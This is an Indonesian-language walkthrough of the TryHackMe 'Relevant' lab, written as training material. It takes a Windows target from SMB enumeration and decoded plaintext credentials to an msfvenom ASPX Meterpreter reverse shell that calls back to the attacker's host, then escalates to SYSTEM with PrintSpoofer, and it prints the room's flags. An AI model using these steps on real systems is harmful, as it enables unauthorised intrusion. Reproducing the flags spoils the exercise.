# TryHackMe — Relevant: Walkthrough 🏴

> **"Penetration Testing Challenge"**

- **Tingkat Kesulitan:** Menengah
- **Link Room:** [Relevant](https://tryhackme.com/room/relevant)
- **IP Mesin Target:** `10.10.213.73`

---

## Latar Belakang

Kamu telah ditugaskan oleh klien yang ingin melakukan penetration test pada sebuah environment yang akan dirilis ke produksi dalam tujuh hari ke depan.

### Scope of Work (Ruang Lingkup Pekerjaan)

Klien meminta engineer untuk melakukan assessment pada virtual environment yang disediakan. Klien hanya memberikan informasi minimal tentang assessment ini, dan ingin engagement dilakukan dari sudut pandang pelaku jahat (**black box penetration test**). Klien meminta kamu untuk mengamankan dua flag sebagai bukti eksploitasi:

- `User.txt`
- `Root.txt`

**Ketentuan tambahan dari klien:**
- Semua tool atau teknik diperbolehkan, namun diharapkan mencoba eksploitasi manual terlebih dahulu
- Temukan dan catat semua kerentanan yang ditemukan
- Submit flag yang ditemukan ke dashboard
- Hanya IP address yang ditetapkan ke mesinmu yang ada dalam scope
- Temukan dan laporkan SEMUA kerentanan (ya, ada lebih dari satu jalur menuju root)

>  Disarankan untuk mendekati tantangan ini layaknya penetration test sungguhan. Pertimbangkan untuk menulis laporan yang mencakup executive summary, vulnerability & exploitation assessment, dan saran remediasi — ini akan bermanfaat sebagai persiapan untuk sertifikasi eLearnSecurity Certified Professional Penetration Tester (eCPPT) atau karir sebagai penetration tester.

---

## Langkah 1 — Reconnaissance: Nmap Scan

Pertama, lakukan scan Nmap untuk menemukan port-port yang terbuka.

**Perintah:**
```bash
nmap -sV 10.10.74.199
```

**Output:**
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV 10.10.74.199
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-17 19:51 WIB
Nmap scan report for 10.10.74.199 (10.10.74.199)
Host is up (0.38s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.59 seconds
```

Dari hasil scan, beberapa port terbuka antara lain `80/tcp` (HTTP) dan `445/tcp` (SMB).

---

## Langkah 2 — Enumerasi SMB: Menemukan Network Share

Selanjutnya, lakukan enumerasi network share menggunakan `smbclient`.

**Perintah:**
```bash
smbclient -L \\10.10.74.199
```

**Output:**
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\10.10.74.199
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.74.199 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Kita menemukan share menarik bernama **`nt4wrksv`**. Mari kita akses.

---

## Langkah 3 — Mengakses SMB Share & Mengambil File Password

**Perintah:**
```bash
smbclient \\\\10.10.74.199\\nt4wrksv
```

**Output:**
```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.74.199\\nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 04:46:04 2020
  ..                                  D        0  Sun Jul 26 04:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 22:15:33 2020

                7735807 blocks of size 4096. 4937894 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \>
```

Kita berhasil mengunduh file `passwords.txt`.

---

## Langkah 4 — Decode Kredensial Base64

Buka file `passwords.txt` dan decode string base64 di dalamnya.

**Perintah:**
```bash
cat passwords.txt
```

**Output:**
```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Decode masing-masing string:

```bash
echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
```
```
Bob - !P@$$W0rD!123
```

```bash
echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
```
```
Bill - Juw4nnaM4n420696969!$$$
```

Kita mendapatkan kredensial untuk dua user: **Bob** dan **Bill**.

---

## Langkah 5 — Membuat Reverse Shell (Meterpreter)

Karena network share `nt4wrksv` bisa ditulis, kita bisa memanfaatkannya untuk mengunggah reverse shell.

**Buat payload dengan msfvenom:**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.4.34.126 lport=8910 -f aspx -o shell.aspx
```

**Output:**
```
┌──(kali㉿kali)-[~/Documents/tryhackme/relevant]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.4.34.126 lport=8910 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 200774 bytes
Final size of aspx file: 1014987 bytes
Saved as: shell.aspx
```

---

## Langkah 6 — Upload Reverse Shell ke SMB Share

```bash
smbclient \\\\10.10.74.199\\nt4wrksv
```

```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.74.199\\nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (149.1 kb/s) (average 149.1 kb/s)
```

---

## Langkah 7 — Setup Listener di Metasploit

```bash
msfconsole -q
```

```
┌──(kali㉿kali)-[~/Documents/tryhackme/relevant]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.4.34.126
LHOST => 10.4.34.126
msf6 exploit(multi/handler) > set LPORT 8910
LPORT => 8910
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.34.126:8910
```

---

## Langkah 8 — Trigger Reverse Shell

Akses file shell yang telah diupload melalui web server untuk memicu koneksi balik ke listener:

```bash
curl http://10.10.13.92:49663/nt4wrksv/shell.aspx
```

---

## Langkah 9 — Mendapatkan Flag User

Koneksi Meterpreter berhasil masuk, kemudian baca flag user:

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.4.34.126:8910
[*] Meterpreter session 2 opened (10.4.34.126:8910 -> 10.10.13.92:49692) at 2023-09-17 21:00:27 +0700

meterpreter > cat C:/users/bob/desktop/user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
meterpreter >
```

**User Flag:** **`THM{fdk4ka34vk346ksxfr21tg789ktf45}`**

---

## Langkah 10 — Privilege Escalation dengan PrintSpoofer

### Cek Privileges yang Tersedia

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

Kita menemukan **`SeImpersonatePrivilege`** yang aktif — ini bisa dieksploitasi!

### Download PrintSpoofer

Untuk melakukan privilege escalation menggunakan `SeImpersonatePrivilege`, kita gunakan tool **PrintSpoofer**:

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

### Upload PrintSpoofer ke SMB Share

```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.13.92\\nt4wrksv
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (17.5 kb/s) (average 17.5 kb/s)

smb: \> dir
  .                                   D        0  Sun Sep 17 21:09:03 2023
  ..                                  D        0  Sun Sep 17 21:09:03 2023
  passwords.txt                       A       98  Sat Jul 25 22:15:33 2020
  PrintSpoofer64.exe                  A     3934  Sun Sep 17 21:09:04 2023
  shell.aspx                          A  1014987  Sun Sep 17 20:59:47 2023

                7735807 blocks of size 4096. 5138597 blocks available
```

### Pindah ke Shell Biasa dari Meterpreter

```
meterpreter > shell
Process 2064 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv> cd c:/inetpub/wwwroot/nt4wrksv

c:\inetpub\wwwroot\nt4wrksv> dir

 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

09/17/2023  07:29 AM    <DIR>          .
09/17/2023  07:29 AM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
09/17/2023  07:29 AM            27,136 PrintSpoofer64.exe
09/17/2023  06:59 AM         1,014,987 shell.aspx
               4 File(s)      1,046,155 bytes
               2 Dir(s)  21,047,664,640 bytes free
```

### Eksekusi PrintSpoofer untuk Mendapatkan SYSTEM

```
c:\inetpub\wwwroot\nt4wrksv> PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
```

Kita berhasil menjadi **`nt authority\system`** — akses penuh ke mesin!

### Mendapatkan Flag Root

```
PS C:\Windows\system32> cd \users\administrator\desktop

PS C:\users\administrator\desktop> dir

    Directory: C:\users\administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/25/2020   8:25 AM             35 root.txt

PS C:\users\administrator\desktop> cat root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```

 **Root Flag:** **`THM{1fk5kf469devly1gl320zafgl345pv}`**

---

##  SELAMAT! Room Berhasil Ditaklukkan!

Kita telah berhasil menyelesaikan room **Relevant** di TryHackMe!

### Rangkuman Serangan

| Tahap | Teknik | Tool |
|-------|--------|------|
| Reconnaissance | Port scanning | Nmap |
| Enumeration | SMB share enumeration | smbclient |
| Credential Discovery | Download & decode file base64 | cat, base64 |
| Initial Access | Upload reverse shell ASPX via SMB + trigger via HTTP | msfvenom, smbclient, curl |
| Shell | Meterpreter listener | Metasploit (multi/handler) |
| Privilege Escalation | SeImpersonatePrivilege abuse | PrintSpoofer64 |

---

## Referensi

- 🔗 [TryHackMe — Relevant Room](https://tryhackme.com/room/relevant)
- 🔗 [PrintSpoofer — GitHub](https://github.com/itm4n/PrintSpoofer)
